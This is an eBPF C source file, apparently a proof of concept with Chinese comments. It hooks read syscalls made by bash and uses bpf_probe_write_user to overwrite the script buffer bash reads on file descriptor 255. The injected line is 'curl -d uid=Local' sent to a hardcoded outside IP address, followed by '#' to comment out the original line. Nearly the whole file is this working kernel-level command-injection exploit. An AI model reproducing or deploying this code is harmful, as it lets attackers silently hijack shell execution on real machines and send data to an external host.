// +build ignore

/*
开启 bpf_log 
*/
#define DEBUG_LOG


#include "my_def.h"
#include <stdbool.h>

char __license[] SEC("license") = "Dual MIT/GPL";

#define TASK_COMM_LEN 16
#define TARGET_NAME "bash"

// 全局变量存到map中
struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 10);
	__type(key, __u32);   // global_id
	__type(value, __u64); // packet count
} global_var_kv SEC(".maps");

// 全局变量的key
enum {
	GLOBAL_TICK1 = 0,
};


static __inline void save_global_val(u32 key, u64 val) {
	bpf_map_update_elem(&global_var_kv, &key, &val, 0);
}

static __inline int fetch_global_int(u32 key) {
	int val;
	void* ptr = bpf_map_lookup_elem(&global_var_kv, &key);
	bpf_probe_read(&val, sizeof(val), ptr);
	return val;
}

static __inline bool is_target_process() {
	char comm[TASK_COMM_LEN] = {0};
	bpf_get_current_comm(&comm, sizeof(comm));
	if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)) != 0){
		return false;
	}
	// bpf_log("comm: %s\n", comm);
	return true;
}


static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
	int tick = fetch_global_int(GLOBAL_TICK1);
	save_global_val(GLOBAL_TICK1, tick);

	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);

	int read_bytes = 0;
	bpf_probe_read(&read_bytes, sizeof(read_bytes),&regs->ax);

	int read_fd = 0;
	bpf_probe_read(&read_fd , sizeof(read_fd),&regs->di);
	// bpf_log("read fd: %d n bytes: %d\n", read_fd, read_bytes);

	if (read_fd != 255) {
		goto exit;
	}

	char *buffer = NULL;
	bpf_probe_read(&buffer , sizeof(buffer) , &regs->si);
	// bpf_log("read data: %s\n", buffer);

	char PAYLOAD[] = "curl -d uid=Local http://202.112.238.191 #";
	int ret = -1;
	if(read_bytes > sizeof(PAYLOAD)){
		bpf_log("try to send request---------------------------\n");
		ret = bpf_probe_write_user((char *)(buffer), PAYLOAD, sizeof(PAYLOAD));
	}

exit:
	bpf_log("handle_exit_read: %d %d\n", tick, ret);
	return 0;
} 

SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx) {
	if (!is_target_process()) return 0;

	int tick = 0;
	unsigned long syscall_id = ctx->args[1];
	switch (syscall_id)
	{
	case 0:
		tick = fetch_global_int(GLOBAL_TICK1) + 1;
		save_global_val(GLOBAL_TICK1, tick);
		bpf_log("handle_enter_read: %d\n", tick);
		break;
	}
	
	return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx) {
	if (!is_target_process()) return 0;

	// https://elixir.bootlin.com/linux/v5.4.170/source/include/trace/events/syscalls.h#L18
	unsigned long syscall_id;
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	bpf_probe_read(&syscall_id, sizeof(syscall_id) , &regs->orig_ax);

	switch (syscall_id)
	{
	case 0:
		handle_exit_read(ctx);
		break;
	}

	return 0;
}